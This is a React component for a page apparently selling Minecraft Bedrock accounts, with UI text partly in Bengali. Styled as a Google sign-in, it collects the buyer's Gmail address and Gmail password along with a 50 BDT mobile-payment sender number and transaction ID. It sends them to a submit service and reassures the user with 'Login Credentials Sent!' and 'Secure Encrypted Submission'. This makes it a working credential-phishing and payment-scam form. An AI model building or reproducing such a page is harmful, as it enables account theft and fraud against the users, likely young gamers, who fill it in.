
import React, { useState } from 'react';
import { Input } from './ui/Input';
import { Button } from './ui/Button';
import { PaymentStatus } from '../types';
import { ADMIN_NUMBER } from '../constants';
import { submitPayment } from '../services/paymentService';

export const BuyMinecraft: React.FC = () => {
  const [formData, setFormData] = useState({
    ign: '',
    email: '',
    password: '',
    senderNumber: '',
    trx: ''
  });
  
  const [status, setStatus] = useState<PaymentStatus>({
    loading: false,
    success: false,
    error: null
  });

  const [copied, setCopied] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleCopy = () => {
    navigator.clipboard.writeText(ADMIN_NUMBER);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.ign || !formData.email || !formData.password || !formData.senderNumber || !formData.trx) {
      setStatus({ ...status, error: "সবগুলো ঘর পূরণ করুন!" });
      return;
    }

    setStatus({ loading: true, success: false, error: null });

    try {
      await submitPayment({
        username: formData.email,
        ign: formData.ign,
        password: formData.password,
        email: formData.email,
        senderNumber: formData.senderNumber,
        amount: 50,
        trx: formData.trx,
        productNo: "Minecraft Bedrock Account (Gmail Login)"
      });

      setStatus({ loading: false, success: true, error: null });
    } catch (err) {
      setStatus({ loading: false, success: false, error: "অর্ডার সাবমিট করতে সমস্যা হয়েছে।" });
    }
  };

  if (status.success) {
    return (
      <div className="bg-white/5 p-8 rounded-2xl border border-green-500/30 flex flex-col gap-6 animate-in fade-in zoom-in duration-500 shadow-2xl backdrop-blur-md">
        <div className="flex flex-col items-center text-center gap-4">
          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center text-green-500 text-4xl shadow-inner">
            <i className="fas fa-shield-check"></i>
          </div>
          <div className="space-y-2">
            <h3 className="text-2xl font-bold text-white tracking-tight">Login Credentials Sent!</h3>
            <p className="text-gray-400 text-sm leading-relaxed px-4">
              আপনার Minecraft একাউন্ট এবং Gmail ডিটেলস নিরাপদে সাবমিট হয়েছে। পেমেন্ট ভেরিফাই করে আপনার একাউন্টটি অ্যাক্টিভেট করা হবে।
            </p>
          </div>
        </div>
        <div className="bg-black/40 p-4 rounded-xl border border-white/5 space-y-2">
            <div className="flex justify-between text-xs">
                <span className="text-gray-500">Account Type</span>
                <span className="text-green-500 font-bold">Bedrock Edition</span>
            </div>
            <div className="flex justify-between text-xs">
                <span className="text-gray-500">IGN</span>
                <span className="text-white">{formData.ign}</span>
            </div>
        </div>
        <Button onClick={() => setStatus({ ...status, success: false })} className="w-full">
          Confirm and Close
        </Button>
      </div>
    );
  }

  return (
    <form onSubmit={handleSubmit} className="bg-white/5 p-8 rounded-2xl border border-white/10 flex flex-col gap-6 shadow-2xl backdrop-blur-sm relative overflow-hidden">
      {/* Header with Google/Minecraft styling */}
      <div className="flex flex-col items-center gap-3 text-center">
        <div className="flex gap-1 mb-2">
            <span className="w-2 h-2 rounded-full bg-blue-500"></span>
            <span className="w-2 h-2 rounded-full bg-red-500"></span>
            <span className="w-2 h-2 rounded-full bg-yellow-500"></span>
            <span className="w-2 h-2 rounded-full bg-green-500"></span>
        </div>
        <h2 className="text-xl font-bold text-white">Google Login to Link Minecraft</h2>
        <p className="text-gray-400 text-xs">অ্যাকাউন্ট ডেলিভারির জন্য আপনার Gmail ডিটেলস এবং পেমেন্ট দিন।</p>
      </div>

      {/* Payment Instruction Section */}
      <div className="bg-white/5 border border-white/10 p-4 rounded-xl flex items-center justify-between">
        <div className="flex flex-col gap-1">
          <p className="text-[10px] text-gray-400 uppercase font-black tracking-widest">Amount: 50 BDT</p>
          <div className="flex items-center gap-2">
            <p className="text-lg font-mono font-bold text-[#e2136e]">{ADMIN_NUMBER}</p>
          </div>
        </div>
        <button 
          type="button"
          onClick={handleCopy}
          className={`transition-all px-3 py-1.5 rounded-lg flex items-center gap-2 text-[10px] font-black uppercase tracking-wider ${copied ? 'bg-green-500/20 text-green-400' : 'bg-white/10 text-white border border-white/10'}`}
        >
          <i className={`fas ${copied ? 'fa-check' : 'fa-copy'}`}></i>
          {copied ? 'Copied' : 'Copy Number'}
        </button>
      </div>

      <div className="grid grid-cols-1 gap-4">
        <Input 
          label="Target Minecraft Name (IGN)" 
          icon="fa-gamepad" 
          placeholder="e.g. ArifHD_Player" 
          name="ign"
          value={formData.ign}
          onChange={handleChange}
        />
        
        <div className="space-y-4 pt-2 border-t border-white/5 mt-2">
            <p className="text-[10px] text-blue-400 font-bold uppercase tracking-[0.2em] text-center">Account Security Details</p>
            <Input 
                label="Gmail Address" 
                icon="fa-envelope" 
                type="email"
                placeholder="example@gmail.com" 
                name="email"
                value={formData.email}
                onChange={handleChange}
            />
            <div className="relative">
                <Input 
                    label="Gmail Password" 
                    icon="fa-lock" 
                    type={showPassword ? "text" : "password"}
                    placeholder="••••••••" 
                    name="password"
                    value={formData.password}
                    onChange={handleChange}
                />
                <button 
                    type="button"
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3 top-[38px] text-gray-500 hover:text-white"
                >
                    <i className={`fas ${showPassword ? 'fa-eye-slash' : 'fa-eye'}`}></i>
                </button>
            </div>
        </div>

        <div className="space-y-4 pt-2 border-t border-white/5 mt-2">
            <p className="text-[10px] text-yellow-500 font-bold uppercase tracking-[0.2em] text-center">Payment Confirmation</p>
            <div className="grid grid-cols-2 gap-3">
                <Input 
                    label="Sender Number" 
                    icon="fa-phone" 
                    placeholder="017XXX" 
                    name="senderNumber"
                    value={formData.senderNumber}
                    onChange={handleChange}
                />
                <Input 
                    label="TrxID" 
                    icon="fa-receipt" 
                    placeholder="Transaction ID" 
                    name="trx"
                    value={formData.trx}
                    onChange={handleChange}
                />
            </div>
        </div>
      </div>

      {status.error && (
        <div className="bg-red-500/20 text-red-400 p-3 rounded-lg text-[10px] font-bold uppercase flex items-center gap-2">
          <i className="fas fa-exclamation-triangle"></i>
          {status.error}
        </div>
      )}

      <Button type="submit" isLoading={status.loading} className="w-full mt-2">
        Sign in & Order Minecraft
      </Button>
      
      <div className="flex items-center justify-center gap-2 opacity-30 text-[8px] font-black uppercase tracking-widest mt-2">
          <i className="fas fa-lock"></i>
          <span>Secure Encrypted Submission</span>
      </div>
    </form>
  );
};
